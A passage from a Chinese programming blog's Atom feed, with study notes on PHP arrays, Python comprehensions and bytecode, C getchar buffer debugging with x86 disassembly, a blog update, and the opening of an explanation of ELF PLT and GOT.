class="number">4</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//解引用语法</span></span><br><span class="line"></span><br><span class="line">$a = getArray()[<span class="number">0</span>];</span><br><span class="line">var_dump($a);</span><br><span class="line"><span class="keyword">list</span>(, $secondelement) = getArray();</span><br><span class="line"></span><br><span class="line">var_dump($secondelement);</span><br></pre></td></tr></table></figure></p><p>输出为：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int(1)</span><br><span class="line">int(2)</span><br></pre></td></tr></table></figure></p><p><code>list</code>定义为：将数组中的值赋值给变量</p><h3>用[]的语法</h3><p>如果有一个数组 <code>$arr = array(5 =&gt; 1, 12 =&gt; 2);</code>那么<code>$arr[] = 56</code>相当于<code>$arr[13]=56</code></p><p>使用<code>unset</code>函数可以取消键值对映射比如<code>unset($arr[5])</code>,或者销毁一个数组<code>unset($arr)</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1&gt;php doc阅读笔记0&lt;/h1&gt;
&lt;h2&gt;array&lt;/h2&gt;
&lt;p&gt;数组是php的key=&amp;gt;value映射
key只能是&lt;code&gt;integer&lt;/code&gt;和&lt;code&gt;string&lt;/code&gt;类型，value可以是任意类型&lt;/p&gt;
&lt;p&gt;所以key会有如
      
    
    </summary>
    
      <category term="note" scheme="https://prontosil.club/categories/note/"/>
    
    
      <category term="php" scheme="https://prontosil.club/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>python文档阅读笔记2</title>
    <link href="https://prontosil.club/2019/07/30/python%E6%96%87%E6%A1%A3%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B02/"/>
    <id>https://prontosil.club/2019/07/30/python文档阅读笔记2/</id>
    <published>2019-07-30T14:50:01.000Z</published>
    <updated>2019-07-30T14:51:49.282Z</updated>
    
    <content type="html"><![CDATA[<h1>fluent python reading notes</h1><h2>列表推导式</h2><p>最常见的一种写法</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">symboles = <span class="string">'ABC%^&amp;*#@$'</span></span><br><span class="line">beyond_ascii = [ord(s) <span class="keyword">for</span> s <span class="keyword">in</span> symboles <span class="keyword">if</span> ord(s) &gt; <span class="number">40</span>]</span><br><span class="line">print(beyond_ascii)</span><br></pre></td></tr></table></figure></p><p>但是也可以同时用<code>filter</code>和<code>map</code>函数来实现</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">beyond_ascii = list(filter(<span class="keyword">lambda</span> x: x &gt; <span class="number">40</span>, map(ord, symboles)))</span><br><span class="line">print(beyond_ascii)</span><br></pre></td></tr></table></figure></p><p>map函数将一个函数作用于list中的每一个值上，filter也是对数组中的每一个值作用一个函数，但是只返回为真的数值，python3中最后返回的是一个filter对象</p><p>比如过滤列表中的所有奇数</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 过滤出列表中的所有奇数</span></span><br><span class="line">a = [<span class="number">1</span>,<span class="number">242</span>,<span class="number">45</span>,<span class="number">23</span>,<span class="number">536</span>,<span class="number">1</span>,<span class="number">325</span>,<span class="number">63635</span>,<span class="number">56335</span>]</span><br><span class="line">a_is_odd = list(filter(<span class="keyword">lambda</span> x: x % <span class="number">2</span> != <span class="number">0</span>, a))</span><br><span class="line">print(a_is_odd)</span><br></pre></td></tr></table></figure></p><p>再比如过滤出1~100中平方根是整数的数字所谓整数就是能整除1的数字</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#过滤出1~100中平方根是整数的数</span></span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line">g_is = list(filter(<span class="keyword">lambda</span> x: math.sqrt(x) % <span class="number">1</span> == <span class="number">0</span>, range(<span class="number">1</span>, <span class="number">101</span>)))</span><br><span class="line">print(g_is)</span><br></pre></td></tr></table></figure></p><h2>解包</h2><p>如下是一个比较神奇的栗子，<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python解包</span></span><br><span class="line">colors = [<span class="string">'black'</span>, <span class="string">'white'</span>]</span><br><span class="line">sizes = [<span class="string">'S'</span>, <span class="string">'M'</span>, <span class="string">'L'</span>]</span><br><span class="line"><span class="keyword">for</span> tshirt <span class="keyword">in</span> (<span class="string">'%s %s'</span> % (c, s) <span class="keyword">for</span> c <span class="keyword">in</span> colors</span><br><span class="line">                                <span class="keyword">for</span> s <span class="keyword">in</span> sizes):</span><br><span class="line">    print(tshirt)</span><br></pre></td></tr></table></figure></p><p>这里用一个<code>%</code>将元组进行了拆包如何很好地理解列表推导式呢？</p><p>你可以将其想象为一个函数，<code>for c in colors for s in sizes</code> 返回值是<code>(c, s)</code> 用一个<code>%</code>成功地对其进行了拆包转化为字符串形式</p><p>下面这幅图应该比较好理解<img src="/assets/python_dvmmoijlo.png" alt="python"></p><p>然后就有了返回值<img src="/assets/python0_9np9b5bvn.png" alt="python0"></p><p>当然还有这种写法：</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a, b, *rst = range(<span class="number">5</span>)</span><br></pre></td></tr></table></figure></p><h2>陷阱</h2><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">t = (<span class="number">1</span>,<span class="number">2</span>, [<span class="number">30</span>, <span class="number">40</span>])</span><br><span class="line">t[<span class="number">2</span>] += [<span class="number">50</span>, <span class="number">60</span>]</span><br><span class="line">print(t)</span><br></pre></td></tr></table></figure></p><p>在一个不可变对象中插入了可变对象！</p><p>虽然报错但是t的值确实被修改了</p><p>对其进行反汇编或者是反编译：得到：</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3</span>           <span class="number">0</span> LOAD_CONST               <span class="number">1</span> (<span class="number">1</span>)</span><br><span class="line">              <span class="number">3</span> LOAD_CONST               <span class="number">2</span> (<span class="number">2</span>)</span><br><span class="line">              <span class="number">6</span> LOAD_CONST               <span class="number">3</span> (<span class="number">30</span>)</span><br><span class="line">              <span class="number">9</span> LOAD_CONST               <span class="number">4</span> (<span class="number">40</span>)</span><br><span class="line">             <span class="number">12</span> BUILD_LIST               <span class="number">2</span></span><br><span class="line">             <span class="number">15</span> BUILD_TUPLE              <span class="number">3</span></span><br><span class="line">             <span class="number">18</span> STORE_FAST               <span class="number">0</span> (t)</span><br><span class="line"></span><br><span class="line">  <span class="number">4</span>          <span class="number">21</span> LOAD_FAST                <span class="number">0</span> (t)</span><br><span class="line">             <span class="number">24</span> LOAD_CONST               <span class="number">2</span> (<span class="number">2</span>)</span><br><span class="line">             <span class="number">27</span> DUP_TOP_TWO</span><br><span class="line">             <span class="number">28</span> BINARY_SUBSCR</span><br><span class="line">             <span class="number">29</span> LOAD_CONST               <span class="number">5</span> (<span class="number">50</span>)</span><br><span class="line">             <span class="number">32</span> LOAD_CONST               <span class="number">6</span> (<span class="number">60</span>)</span><br><span class="line">             <span class="number">35</span> BUILD_LIST               <span class="number">2</span></span><br><span class="line">             <span class="number">38</span> INPLACE_ADD</span><br><span class="line">             <span class="number">39</span> ROT_THREE</span><br><span class="line">             <span class="number">40</span> STORE_SUBSCR</span><br></pre></td></tr></table></figure></p><p>作者提出的三个教训：</p><ol><li>不要把可变对象放在元组里面</li><li>增量赋值不是一个原子操作</li><li>查看python的字节码并不难，而且了解代码背后的运行机制很有帮助</li></ol><p>然后我们就来研究python的字节码</p><h2>python字节码</h2><h3>变量</h3><blockquote><p>LOAD_FAST一般加载局部变量的值，也就是读取值，用于计算或者函数调用传参等。STORE_FAST一般用于保存值到局部变量。</p></blockquote><p>比如：</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">61</span>          <span class="number">77</span> LOAD_FAST                <span class="number">0</span> (n)</span><br><span class="line">             <span class="number">80</span> LOAD_FAST                <span class="number">3</span> (p)</span><br><span class="line">             <span class="number">83</span> INPLACE_DIVIDE</span><br><span class="line">             <span class="number">84</span> STORE_FAST               <span class="number">0</span> (n)</span><br></pre></td></tr></table></figure></p><p><code>INPLACE_DIVIDE</code>就是原地除法，先加载n，然后加载p，然后除法，然后保存结果</p><p>对应的就是</p><p><code>n = n/p</code></p><blockquote><p>如何区分函数形参和其他的局部变量？</p></blockquote><blockquote><p>形参没有初始化，也就是从函数开始到LOAD_FAST该变量的位置，如果没有看到STORE_FAST，那么该变量就是函数形参。</p></blockquote><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">4</span>           <span class="number">0</span> LOAD_CONST               <span class="number">1</span> (<span class="number">0</span>)</span><br><span class="line">            <span class="number">3</span> STORE_FAST               <span class="number">1</span> (local1)</span><br><span class="line"></span><br><span class="line"><span class="number">5</span>           <span class="number">6</span> LOAD_FAST                <span class="number">1</span> (local1)</span><br><span class="line">            <span class="number">9</span> PRINT_ITEM</span><br><span class="line">           <span class="number">10</span> LOAD_FAST                <span class="number">0</span> (arg1)</span><br><span class="line">           <span class="number">13</span> PRINT_ITEM</span><br><span class="line">           <span class="number">14</span> PRINT_NEWLINE</span><br><span class="line">           <span class="number">15</span> LOAD_CONST               <span class="number">0</span> (<span class="keyword">None</span>)</span><br><span class="line">           <span class="number">18</span> RETURN_VALUE</span><br></pre></td></tr></table></figure></p><p>这里<code>arg1</code>就没有<code>STORE_FAST</code>所以对应的源代码为：</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">(arg1)</span>:</span></span><br><span class="line">    local1 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">print</span> local1, arg1</span><br></pre></td></tr></table></figure></p><h3>全局变量</h3><blockquote><p>LOAD_GLOBAL用来加载全局变量，包括指定函数名，类名，模块名等全局符号。</p></blockquote><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">8</span>           <span class="number">6</span> LOAD_CONST               <span class="number">2</span> (<span class="number">101</span>)</span><br><span class="line">            <span class="number">9</span> STORE_GLOBAL             <span class="number">0</span> (global1)</span><br><span class="line">            <span class="number">20</span> LOAD_GLOBAL              <span class="number">0</span> (global1)</span><br><span class="line">            <span class="number">23</span> PRINT_ITEM</span><br></pre></td></tr></table></figure></p><p>对应的python代码：</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> global1</span><br><span class="line">    global1 = <span class="number">101</span></span><br><span class="line">    <span class="keyword">print</span> global1</span><br></pre></td></tr></table></figure></p><h3>常用数据类型</h3><blockquote><p>BUILD_LIST用于创建一个list结构。</p></blockquote><p>如果是用列表推导式呢？</p><blockquote><p>BUILD_MAP用于创建一个空的dict。STORE_MAP用于初始化dict的内容。</p></blockquote><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3</span>           <span class="number">0</span> LOAD_CONST               <span class="number">1</span> (<span class="string">'a'</span>)</span><br><span class="line">              <span class="number">3</span> LOAD_CONST               <span class="number">2</span> (<span class="string">'1'</span>)</span><br><span class="line">              <span class="number">6</span> BUILD_MAP                <span class="number">1</span></span><br><span class="line">              <span class="number">9</span> STORE_FAST               <span class="number">0</span> (k)</span><br><span class="line">             <span class="number">12</span> LOAD_CONST               <span class="number">0</span> (<span class="keyword">None</span>)</span><br><span class="line">             <span class="number">15</span> RETURN_VALUE</span><br></pre></td></tr></table></figure></p><h1>参考</h1><p><a href="https://zhuanlan.zhihu.com/p/45101508" target="_blank" rel="noopener">死磕python字节码-手工还原python源码</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1&gt;fluent python reading notes&lt;/h1&gt;
&lt;h2&gt;列表推导式&lt;/h2&gt;
&lt;p&gt;最常见的一种写法&lt;/p&gt;
&lt;p&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;
      
    
    </summary>
    
      <category term="note" scheme="https://prontosil.club/categories/note/"/>
    
    
      <category term="python" scheme="https://prontosil.club/tags/python/"/>
    
      <category term="python字节码" scheme="https://prontosil.club/tags/python%E5%AD%97%E8%8A%82%E7%A0%81/"/>
    
      <category term="tricks" scheme="https://prontosil.club/tags/tricks/"/>
    
  </entry>
  
  <entry>
    <title>C语言缓冲区</title>
    <link href="https://prontosil.club/2019/07/30/C%E8%AF%AD%E8%A8%80%E7%BC%93%E5%86%B2%E5%8C%BA/"/>
    <id>https://prontosil.club/2019/07/30/C语言缓冲区/</id>
    <published>2019-07-30T14:47:28.000Z</published>
    <updated>2019-07-30T14:48:50.335Z</updated>
    
    <content type="html"><![CDATA[<h1>调试一下c语言程序</h1><p>自我感觉很久没写C语言了</p><h2>getchar函数</h2><p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">char</span> a = getchar();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"a is %c\n"</span>, a);</span><br><span class="line"><span class="keyword">char</span> b = getchar();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"b is %c\n"</span>, b);</span><br><span class="line"><span class="keyword">char</span> c = getchar();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"c is %c\n"</span>, c);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure></p><p>getchar函数是依次从缓冲区中取出字符来，会取走的！！</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nihao</span><br><span class="line">a is n</span><br><span class="line">b is i</span><br><span class="line">c is h</span><br></pre></td></tr></table></figure></p><p>这一行<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (; <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;nums[i]) != <span class="number">0</span> &amp;&amp; getchar() == <span class="string">' '</span>; ++i)</span><br><span class="line">nums = (<span class="keyword">int</span>*)<span class="built_in">realloc</span>(nums, <span class="keyword">sizeof</span>(<span class="keyword">int</span>) * (i + <span class="number">1</span>)); <span class="comment">//数组为非降序排列</span></span><br></pre></td></tr></table></figure></p><p>这里会要求用户输入数据，用户输入的数据就是会存放在缓冲区内，然后之后scanf每次读一个数字，getchar紧随其后读一个字符，所以我们输入的时候必须是一个数字一个空格</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">while (getchar() == &apos;\n&apos; || getchar() == EOF || getchar() == &apos;\0&apos;);</span><br></pre></td></tr></table></figure></p><p>之后把缓冲区的字符读干净</p><p>测试一下，如果我输入<code>12 21\n</code></p><p>那么scanf读完21之后，getchar函数读<code>\n</code></p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00D52466  je          main+0DEh (0D524AEh)  </span><br><span class="line">00D52468  mov         esi,esp  </span><br><span class="line">00D5246A  call        dword ptr [__imp__getchar (0D5F220h)]   ;函数返回值存放在eax中，十进制10，代表LF</span><br><span class="line">00D52470  cmp         esi,esp  </span><br><span class="line">00D52472  call        __RTC_CheckEsp (0D51357h)  </span><br><span class="line">00D52477  cmp         eax,20h  </span><br><span class="line">00D5247A  jne         main+0DEh (0D524AEh)</span><br></pre></td></tr></table></figure></p><p>关键是这两条指令：</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">00D52472  call        __RTC_CheckEsp (0D51357h)  </span><br><span class="line">00D52477  cmp         eax,20h</span><br></pre></td></tr></table></figure></p><p>所以之后比较<code>cmp eax 20h</code>就会跳出循环</p><p>之后进入那个while循环</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">while (getchar() == &apos;\n&apos; || getchar() == EOF || getchar() == &apos;\0&apos;);</span><br><span class="line">00D524AE  mov         esi,esp  </span><br><span class="line">00D524B0  call        dword ptr [__imp__getchar (0D5F220h)]  </span><br><span class="line">00D524B6  cmp         esi,esp  </span><br><span class="line">00D524B8  call        __RTC_CheckEsp (0D51357h)  </span><br><span class="line">00D524BD  cmp         eax,0Ah  </span><br><span class="line">00D524C0  je          main+119h (0D524E9h)</span><br></pre></td></tr></table></figure></p><p>此时缓冲区已经是空的了，所以会要求用户继续输入数据我此时输入了 <code>1\n</code>所以调用完<code>getchar</code>函数之后eax存放了十六进制的49</p><p>那么第二个调用<code>getchar</code>读取的结果就是<code>0Ah</code></p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00D524C2  mov         esi,esp  </span><br><span class="line">00D524C4  call        dword ptr [__imp__getchar (0D5F220h)]  </span><br><span class="line">00D524CA  cmp         esi,esp  </span><br><span class="line">00D524CC  call        __RTC_CheckEsp (0D51357h)  </span><br><span class="line">00D524D1  cmp         eax,0FFFFFFFFh</span><br></pre></td></tr></table></figure></p><p>继续。此时缓冲区已经空了</p><p>那么会要求用户继续输入我又输入了一个换行符，很明显此时读取的结果非空，所以跳出while循环</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00D524D8  call        dword ptr [__imp__getchar (0D5F220h)]  </span><br><span class="line">00D524DE  cmp         esi,esp  </span><br><span class="line">00D524E0  call        __RTC_CheckEsp (0D51357h)  </span><br><span class="line">00D524E5  test        eax,eax   ;检查eax是否为空</span><br><span class="line">00D524E7  jne         main+11Bh (0D524EBh)  </span><br><span class="line">00D524E9  jmp         main+0DEh (0D524AEh)</span><br></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/YrxXMwq.png" alt="eax"></p><h2>遇到的尴尬</h2><p>如果要程序的健壮性，那么用户多输入一个空格就会出错，因为多输入一个空格程序就不知道后面那个是什么了，同时还涉及到<code>getchar</code>函数清空缓冲区，那个while循环的写法确实很经典，但是就没有考虑过如果缓冲区本身就是空的呢？</p><p>我修改了一下原有的代码，加入了<code>cin.peek</code>函数来帮助判断</p><p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">nums = (<span class="keyword">int</span>*)<span class="built_in">realloc</span>(nums, <span class="keyword">sizeof</span>(<span class="keyword">int</span>) * (i + <span class="number">1</span>));</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;nums[i]);</span><br><span class="line">i++;</span><br><span class="line"><span class="keyword">char</span> ch = getchar();</span><br><span class="line"><span class="keyword">if</span> (ch == <span class="string">' '</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">isdigit</span>(<span class="built_in">cin</span>.peek()))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (ch == <span class="string">'\n'</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//    for(;scanf("%d", &amp;nums[i]) != 0 &amp;&amp; getchar() == '\n'; i++)</span></span><br><span class="line"><span class="comment">//    &#123;</span></span><br><span class="line"><span class="comment">//        nums = (int *)realloc(nums, sizeof(int)*(i+1));</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">fflush(<span class="built_in">stdin</span>);</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1&gt;调试一下c语言程序&lt;/h1&gt;
&lt;p&gt;自我感觉很久没写C语言了&lt;/p&gt;
&lt;h2&gt;getchar函数&lt;/h2&gt;
&lt;p&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;lin
      
    
    </summary>
    
      <category term="note" scheme="https://prontosil.club/categories/note/"/>
    
    
      <category term="C" scheme="https://prontosil.club/tags/C/"/>
    
      <category term="缓冲区" scheme="https://prontosil.club/tags/%E7%BC%93%E5%86%B2%E5%8C%BA/"/>
    
      <category term="getchar" scheme="https://prontosil.club/tags/getchar/"/>
    
      <category term="x86" scheme="https://prontosil.club/tags/x86/"/>
    
  </entry>
  
  <entry>
    <title>blog 更新小记</title>
    <link href="https://prontosil.club/2019/07/30/blog-%E6%9B%B4%E6%96%B0%E5%B0%8F%E8%AE%B0/"/>
    <id>https://prontosil.club/2019/07/30/blog-更新小记/</id>
    <published>2019-07-30T14:37:09.000Z</published>
    <updated>2019-07-30T14:59:41.662Z</updated>
    
    <content type="html"><![CDATA[<h2>更新</h2><p>简单地更新了一下自己的blog，虽然是这么说，但是实际上还是花了不少时间来完善，主要有：</p><ul><li>修改了代码的高亮格式，黑色的主题更好看一些</li><li>更换了blog的markdown引擎，可以渲染emoj了</li><li>修改了自我介绍，去掉了网易云音乐的外链，因为失效了，同时添加了简书和知乎链接</li><li>添加了友链</li><li>添加了评论gitment</li></ul><h2><em>TODO</em></h2><p>搜索功能没有没法用</p><p>blog还可以更美化一点</p><h2>一点感想</h2><p>喜欢自己搭建的这个小天地，虽然有这么或者那么的不完善，但是这个blog见证着我的成长！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2&gt;更新&lt;/h2&gt;
&lt;p&gt;简单地更新了一下自己的blog，虽然是这么说，但是实际上还是花了不少时间来完善，主要有：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;修改了代码的高亮格式，黑色的主题更好看一些&lt;/li&gt;
&lt;li&gt;更换了blog的markdown引擎，可以渲染emoj了&lt;/li&gt;
&lt;l
      
    
    </summary>
    
      <category term="config" scheme="https://prontosil.club/categories/config/"/>
    
    
      <category term="blog" scheme="https://prontosil.club/tags/blog/"/>
    
      <category term="hexo" scheme="https://prontosil.club/tags/hexo/"/>
    
  </entry>
  
  <entry>
    <title>聊聊plt与got</title>
    <link href="https://prontosil.club/2019/07/24/%E8%81%8A%E8%81%8Aplt%E4%B8%8Egot/"/>
    <id>https://prontosil.club/2019/07/24/聊聊plt与got/</id>
    <published>2019-07-24T12:46:14.000Z</published>
    <updated>2019-07-24T12:50:39.853Z</updated>
    
    <content type="html"><![CDATA[<h1>深入理解plt和got</h1><p>先写一段代码：</p><p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Build with: gcc -m32 --no-pie -g -o plt plt.c</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Hello world!"</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>途中遇到了一个报错：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">In file included from /usr/include/stdio.h:27:0,</span><br><span class="line">                 from plt.c:3:</span><br><span class="line">/usr/include/features.h:374:25: fatal error: sys/cdefs.h: No such file or directory</span><br><span class="line"> #  include &lt;sys/cdefs.h&gt;</span><br></pre></td></tr></table></figure></p><p>然后安装一个:<code>apt install libc6-dev-i386</code></p><p>编译好程序之后</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec plt     </span><br><span class="line">[*] &apos;/home/pxy/pwnable/plt&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure></p><p>程序是没有pie的</p><p><code>readelf -S plt</code>查看节表</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">[12] .plt              PROGBITS        08048300 000300 000050 04  AX  0   0 16</span><br><span class="line">[13] .text             PROGBITS        08048350 000350 000192 00  AX  0   0 16</span><br><span class="line">[22] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4</span><br><span class="line">[23] .got.plt          PROGBITS        0804a000 001000 00001c 04  WA  0   0  4</span><br></pre></td></tr></table></figure></p><p>可以看到：</p><ul><li>.plt 基地址为： <code>0x08048300</code></li><li>.got 基地址为： <code>0x08049ffc</code></li><li>.got.plt 基地址为： <code>0x0x804a000</code></li></ul><p>我们从调用puts函数那里开始单步执行</p><p>首先跳转到plt表中<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x804845d &lt;main+16&gt;               call   puts@plt &lt;0x8048310&gt;</span><br><span class="line">0x8048310  &lt;puts@plt&gt;                  jmp    dword ptr [puts@got.plt] &lt;0x804a00c&gt;</span><br></pre></td></tr></table></figure></p><p>call puts之后，下一条指令也是一个跳转</p><p><code>jmp dword ptr [puts@got.plt] 